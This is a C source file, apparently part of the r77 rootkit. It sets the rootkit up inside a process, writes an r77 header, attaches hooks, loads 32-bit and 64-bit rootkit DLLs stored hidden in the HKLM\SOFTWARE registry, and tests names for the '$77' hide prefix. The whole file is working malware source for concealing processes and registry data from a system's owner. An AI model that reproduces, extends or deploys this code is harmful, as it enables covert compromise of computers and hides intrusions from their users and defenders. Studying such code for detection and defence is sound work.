#include "Rootkit.h"
#include "Hooks.h"
#include "Config.h"
#include "r77def.h"
#include "r77header.h"
#include <Shlwapi.h>

static BOOL RootkitInitialized;

BOOL InitializeRootkit()
{
	// If the process starts with $77, do not load r77.
	WCHAR executablePath[MAX_PATH + 1];
	if (FAILED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return FALSE;
	if (HasPrefix(PathFindFileNameW(executablePath))) return FALSE;

	// Write the r77 header.
	if (!WriteR77Header(R77_SIGNATURE, DetachRootkit)) return FALSE;

	if (!RootkitInitialized)
	{
		RootkitInitialized = TRUE;

		// Initialize configuration system.
		InitializeConfig();

		// Attach hooks.
		InitializeHooks();

		// Get both r77 DLL's.
		HKEY key;
		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS &&
			RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &RootkitDll32Size) == ERROR_SUCCESS &&
			RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &RootkitDll64Size) == ERROR_SUCCESS)
		{
			LPBYTE dll32 = NEW_ARRAY(BYTE, RootkitDll32Size);
			LPBYTE dll64 = NEW_ARRAY(BYTE, RootkitDll64Size);

			if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, dll32, &RootkitDll32Size) == ERROR_SUCCESS &&
				RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, dll64, &RootkitDll64Size) == ERROR_SUCCESS)
			{
				RootkitDll32 = dll32;
				RootkitDll64 = dll64;
			}
			else
			{
				FREE(dll32);
				FREE(dll64);
			}
		}
	}

	return TRUE;
}
VOID UninitializeRootkit()
{
	if (RootkitInitialized)
	{
		RootkitInitialized = FALSE;

		// Remove the r77 header.
		RemoveR77Header();

		// Uninitialize configuration system.
		UninitializeConfig();

		// Detach hooks.
		UninitializeHooks();

		FREE(RootkitDll32);
		FREE(RootkitDll64);
	}
}
static VOID DetachRootkit()
{
	// A thread was created with a pointer to DetachRootkit(), thus requesting the rootkit to remove itself gracefully.
	UninitializeRootkit();
}

BOOL HasPrefix(LPCWSTR str)
{
	return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}
BOOL HasPrefixU(UNICODE_STRING str)
{
	return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !StrCmpNIW(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}